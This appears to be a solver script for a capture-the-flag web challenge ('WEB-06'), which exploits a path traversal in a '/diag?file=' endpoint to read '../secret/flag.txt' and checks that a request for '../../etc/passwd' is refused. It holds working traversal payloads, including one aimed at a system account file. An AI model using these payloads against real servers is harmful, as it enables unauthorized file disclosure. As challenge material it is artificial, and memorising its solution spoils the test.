#!/usr/bin/env python3
"""WEB-06 Ping tool: /diag?file= concatenates the name onto /storage/diag/.
boot.log mentions secret/flag.txt; ../secret/flag.txt climbs one level up.
Also checks that escaping /storage is refused."""
import re

import requests

import _util as u


def diag(a, name):
    return requests.get(u.url(a, "/diag"), params={"file": name}, timeout=10)


def main():
    a = u.args(__doc__)
    log = diag(a, "boot.log").text
    print("\n".join(l for l in log.splitlines() if "fs:" in l))
    r = diag(a, "../../etc/passwd")
    print(f"../../etc/passwd: HTTP {r.status_code}")
    if r.status_code != 403:
        raise SystemExit("WEB-06: escape outside /storage not refused")
    r = diag(a, "../secret/flag.txt")
    print(f"../secret/flag.txt: HTTP {r.status_code}")
    m = u.FLAG_RE.search(r.text)
    u.finish("WEB-06", m.group(0) if m else None, a)


main()
